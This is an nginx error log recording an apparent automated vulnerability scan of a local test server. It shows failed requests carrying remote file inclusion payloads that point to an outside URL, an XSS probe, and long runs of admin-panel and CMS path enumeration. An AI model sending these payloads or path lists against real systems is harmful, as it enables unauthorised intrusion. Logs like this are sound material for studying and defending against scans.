2019/04/18 20:22:26 [notice] 7436#6776: signal process started
2019/04/18 20:28:01 [emerg] 12700#6984: "server_tokens" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:4
2019/04/18 20:28:29 [emerg] 12460#11644: "add_header" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:8
2019/04/18 20:28:45 [emerg] 8020#7960: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:3
2019/04/18 20:29:48 [emerg] 9964#4972: "server" directive is not allowed here in C:\Users\1234\Desktop\nginx-1.15.9/conf/nginx.conf:2
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/xarg_corner_bottom.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /xarg_corner_bottom.php?xarg=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/xarg_corner_top.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /xarg_corner_top.php?xarg=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/xoopsgallery/init_basic.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?&2093085906=1&995617320=2 HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/xoopsgallery/init_basic.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /xoopsgallery/init_basic.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt??&2093085906=1&995617320=2 HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/xt_counter.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /xt_counter.php?server_base_dir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/yabbse/Sources/Packages.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /yabbse/Sources/Packages.php?sourcedir=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/yacs/scripts/update_trailer.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /yacs/scripts/update_trailer.php?context[path_to_root]=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/yrch/plugins/metasearch/plug.inc.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /yrch/plugins/metasearch/plug.inc.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/ytb/cuenta/cuerpo.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /ytb/cuenta/cuerpo.php?base_archivo=http://cirt.net/rfiinc.txt? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/zipndownload.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /zipndownload.php?PP_PATH=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/zoomstats/libs/dbmax/mysql.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /zoomstats/libs/dbmax/mysql.php?GLOBALS['lib']['db']['path']=http://cirt.net/rfiinc.txt?? HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/wp-content/plugins/akismet/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /wp-content/plugins/akismet/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/wp-content/plugins/hello.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /wp-content/plugins/hello.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/readme.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /readme.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/wp-links-opml.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /wp-links-opml.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/includes/sendmail.inc" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /includes/sendmail.inc HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/license.txt" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /license.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/install.txt" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /install.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/LICENSE.TXT" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /LICENSE.TXT HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/INSTALL.TXT" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /INSTALL.TXT HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/READ_THIS_FIRST.txt" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /READ_THIS_FIRST.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/wp-app.log" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /wp-app.log HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/_vti_bin/_vti_adm/admin.dll" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /_vti_bin/_vti_adm/admin.dll HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/read/rss" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /read/rss?forum=nonexistant&rev=0.92 HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/subscribe/survey~1.tml" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /subscribe/survey~1.tml HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/scripts/message/message_dialog.tml" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /scripts/message/message_dialog.tml?how_many_back=\"><script>alert(1)</script> HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/read/attach_file.tml" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /read/attach_file.tml?page=http://cirt.net/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *183 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/config/config.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /config/config.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/htaccess.txt" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /htaccess.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/typo3/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /typo3/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/cms/typo3/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /cms/typo3/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/site/typo3/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /site/typo3/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/typo/typo3/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /typo/typo3/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/typo3/typo3/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /typo3/typo3/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/ConversionReport.txt" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /ConversionReport.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/cadence/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /cadence/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/cadence/webaccess.net" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /cadence/webaccess.net HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/config/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /config/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/data/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /data/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/log/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /log/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/logs/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /logs/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/uploads/readme.txt" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /uploads/readme.txt HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/cadence/help/help.htm" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /cadence/help/help.htm HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/install/install.aspx" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /install/install.aspx HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/webresource.axd" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /webresource.axd?d=junk HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/scriptresource.axd" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /scriptresource.axd?d=junk HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin1.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin1.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/account.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/account.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/account.html" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/account.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/account.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/account.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/controlpanel.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/controlpanel.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/controlpanel.html" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/controlpanel.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/controlpanel.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/controlpanel.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/cp.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/cp.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/cp.html" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/cp.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/cp.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/cp.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/home.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/home.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/home.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/home.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:01 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/index.html" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/index.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/login.asp" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/login.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/login.html" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/login.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin/login.php" failed (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin/login.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin1.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin1.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin1.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin1.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/admin1/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin1/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin2.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin2.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin2.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin2.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admin2.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin2.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/admin4_account/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin4_account/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/admin4_colon/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admin4_colon/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admincontrol.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admincontrol.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admincontrol.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admincontrol.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/admincontrol.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /admincontrol.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administer/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administer/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administr8.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administr8.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administr8.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administr8.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administr8.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administr8.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administr8/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administr8/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administracao.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administracao.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administra챌ao.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administra챌ao.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administracao/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administracao/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administra챌ao/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administra챌ao/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administracion.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administracion.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administracion/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administracion/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrateur.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrateur.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administrateur/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrateur/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administratie/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administratie/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administration.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administration.html HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administration.php" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administration.php HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 "C:\Users\1234\Desktop\nginx-1.15.9/html/administration/index.html" is not found (3: The system cannot find the path specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administration/ HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator.asp" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator.asp HTTP/1.1", host: "192.168.0.107"
2019/04/18 23:41:02 [error] 8784#13012: *184 CreateFile() "C:\Users\1234\Desktop\nginx-1.15.9/html/administrator.html" failed (2: The system cannot find the file specified), client: 192.168.0.107, server: 192.168.0.107, request: "GET /administrator.html HTTP/1.1", host: "192.168.0.107"
